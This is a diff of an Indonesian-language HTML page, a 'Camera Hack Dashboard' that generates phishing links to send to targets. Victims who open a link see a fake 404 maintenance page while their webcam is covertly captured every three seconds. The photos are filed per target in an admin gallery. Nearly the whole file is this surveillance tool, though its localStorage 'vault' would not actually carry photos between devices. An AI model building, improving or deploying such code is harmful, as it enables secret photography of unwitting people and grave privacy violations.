@@ -1,87 +1,323 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Nesia Darknet - Command Center ☠️</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodingX - Camera Hack Dashboard</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New'; padding: 20px; text-align: center; }
-        .box { border: 2px solid #00ff00; padding: 20px; margin: 10px auto; max-width: 800px; box-shadow: 0 0 15px #00ff00; }
-        .result-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; margin-top: 20px; min-height: 200px; border: 1px dashed #00ff00; padding: 10px; }
-        img { width: 100%; border: 1px solid #fff; }
-        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
-        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 70%; }
-        #target-ui { display: none; } /* Sembunyiin tampilan target dari lo */
+        :root {
+            --primary-color: #00d2ff;
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #f8fafc;
+            --accent: #3b82f6;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Container utama ala HP */
+        .mobile-container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--bg-dark);
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        /* Header Design */
+        .header {
+            text-align: center;
+            margin-top: 30px;
+            margin-bottom: 40px;
+        }
+
+        .logo-circle {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--primary-color), var(--accent));
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
+            border: 3px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo-circle i {
+            font-size: 40px;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            letter-spacing: 2px;
+            font-weight: 800;
+            margin: 0;
+            color: var(--primary-color);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        /* Card Section */
+        .card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #94a3b8;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+
+        /* Copy Link UI */
+        .link-box {
+            display: flex;
+            background: #0f172a;
+            border-radius: 12px;
+            padding: 12px;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .link-box input {
+            background: transparent;
+            border: none;
+            color: #cbd5e1;
+            width: 100%;
+            outline: none;
+            font-size: 13px;
+        }
+
+        .btn-copy {
+            background: var(--primary-color);
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        /* Folder System UI */
+        .folder-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .folder-item {
+            background: #334155;
+            padding: 15px 20px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .folder-item:active {
+            transform: scale(0.98);
+        }
+
+        .folder-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .folder-icon {
+            font-size: 24px;
+            color: #fbbf24;
+        }
+
+        .folder-name {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        /* Gallery Overlay */
+        #gallery-view {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-dark);
+            z-index: 100;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .gallery-grid img {
+            width: 100%;
+            border-radius: 10px;
+            border: 2px solid var(--card-bg);
+        }
+
+        .btn-back {
+            background: transparent;
+            color: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            padding: 10px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        /* Target Phishing View (Hidden for Admin) */
+        #target-view { display: none; text-align: center; padding-top: 100px; }
     </style>
 </head>
 <body>
 
-    <div id="admin-ui">
-        <div class="box">
-            <h1>NESIA DARKNET COMMAND CENTER 😍😈</h1>
-            <p>Salin link ini dan kirim ke target (teman lo):</p>
-            <input type="text" id="p-link" readonly>
-            <button onclick="copyLink()">COPY LINK ☠️</button>
+<div class="mobile-container" id="admin-panel">
+    <div class="header">
+        <div class="logo-circle">
+            <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
         </div>
+        <h1>KAMERA HACK</h1>
+    </div>
 
-        <div class="box">
-            <h3>HASIL SADAP REAL-TIME 📸</h3>
-            <div id="gallery" class="result-box">
-                </div>
+    <div class="card">
+        <div class="section-title">Link Phishing</div>
+        <div class="link-box">
+            <input type="text" id="link-input" readonly value="">
+            <button class="btn-copy" onclick="copyLink()">SALIN</button>
         </div>
     </div>
 
-    <div id="target-ui">
-        <h1>404 Server Error</h1>
-        <p>System sedang maintenance, mohon tunggu...</p>
-        <video id="v" style="display:none;" autoplay></video>
-        <canvas id="c" style="display:none;"></canvas>
+    <div class="card">
+        <div class="section-title">Daftar Target</div>
+        <div class="folder-list" id="target-folders">
+            </div>
     </div>
+</div>
 
-    <script>
-        // OTOMATIS DETEKSI MODE
-        const urlParams = new URLSearchParams(window.location.search);
-        const isTarget = urlParams.get('v') === 'connect';
+<div id="gallery-view">
+    <button class="btn-back" onclick="closeGallery()">⬅ KEMBALI</button>
+    <h2 id="gallery-title" style="color: var(--primary-color);"></h2>
+    <div class="gallery-grid" id="photo-container"></div>
+</div>
 
-        if (!isTarget) {
-            // MODE ADMIN (DASHBOARD)
-            document.getElementById('p-link').value = window.location.href.split('?')[0] + '?v=connect';
-            
-            // Simulasi penarikan data dari database 'cloud' (LocalStorage)
-            setInterval(() => {
-                const gallery = document.getElementById('gallery');
-                const data = JSON.parse(localStorage.getItem('darknet_vault') || '[]');
-                gallery.innerHTML = data.map(img => `<img src="${img}">`).join('');
-            }, 2000);
+<div class="mobile-container" id="target-view">
+    <h1 style="color: #ef4444;">404 Not Found</h1>
+    <p>Maaf, halaman sedang dalam perbaikan berkala.</p>
+    <p style="font-size: 12px; color: #64748b;">Error Code: 0x88291</p>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
 
-        } else {
-            // MODE TARGET (SADAP)
-            document.getElementById('admin-ui').style.display = 'none';
-            document.getElementById('target-ui').style.display = 'block';
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id');
 
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                setInterval(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    const photo = c.toDataURL('image/jpeg');
-                    
-                    // Kirim ke 'Vault' lo
-                    let vault = JSON.parse(localStorage.getItem('darknet_vault') || '[]');
-                    vault.unshift(photo);
-                    localStorage.setItem('darknet_vault', JSON.stringify(vault.slice(0, 30)));
-                }, 3000);
-            }).catch(() => {
-                document.querySelector('.status').innerText = "Koneksi Gagal, Segarkan Halaman.";
+    // 1. LOGIKA ADMIN
+    if (!targetId) {
+        document.getElementById('link-input').value = window.location.href + "?id=" + Math.floor(Math.random() * 9000 + 1000);
+        
+        function renderFolders() {
+            const foldersContainer = document.getElementById('target-folders');
+            const allData = JSON.parse(localStorage.getItem('hack_vault') || '{}');
+            foldersContainer.innerHTML = '';
+
+            Object.keys(allData).forEach((id, index) => {
+                const item = document.createElement('div');
+                item.className = 'folder-item';
+                item.onclick = () => openGallery(id);
+                item.innerHTML = `
+                    <div class="folder-info">
+                        <span class="folder-icon">📂</span>
+                        <span class="folder-name">TARGET ${index + 1} (${id})</span>
+                    </div>
+                    <span style="font-size: 12px; color: #94a3b8;">${allData[id].length} Foto</span>
+                `;
+                foldersContainer.appendChild(item);
             });
         }
 
-        function copyLink() {
-            const copyText = document.getElementById("p-link");
-            copyText.select();
-            document.execCommand("copy");
-            alert("Link maut siap dikirim! 😈☠️");
+        function openGallery(id) {
+            const allData = JSON.parse(localStorage.getItem('hack_vault') || '{}');
+            const photos = allData[id] || [];
+            document.getElementById('gallery-title').innerText = "FOLDER: " + id;
+            const container = document.getElementById('photo-container');
+            container.innerHTML = photos.map(src => `<img src="${src}">`).join('');
+            document.getElementById('gallery-view').style.display = 'block';
         }
-    </script>
+
+        function closeGallery() {
+            document.getElementById('gallery-view').style.display = 'none';
+        }
+
+        setInterval(renderFolders, 3000);
+        renderFolders();
+
+    } else {
+        // 2. LOGIKA TARGET
+        document.getElementById('admin-panel').style.display = 'none';
+        document.getElementById('target-view').style.display = 'block';
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setInterval(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg', 0.5);
+
+                // Simpan ke 'Database' Lokal per ID
+                let allData = JSON.parse(localStorage.getItem('hack_vault') || '{}');
+                if (!allData[targetId]) allData[targetId] = [];
+                allData[targetId].unshift(photoData);
+                if(allData[targetId].length > 15) allData[targetId].pop();
+                localStorage.setItem('hack_vault', JSON.stringify(allData));
+            }, 3000);
+        }).catch(e => {
+            console.log("Akses Ditolak");
+        });
+    }
+
+    function copyLink() {
+        const input = document.getElementById('link-input');
+        input.select();
+        document.execCommand('copy');
+        alert('Link Target Berhasil Disalin! 💼💰');
+    }
+</script>
+
 </body>
 </html>
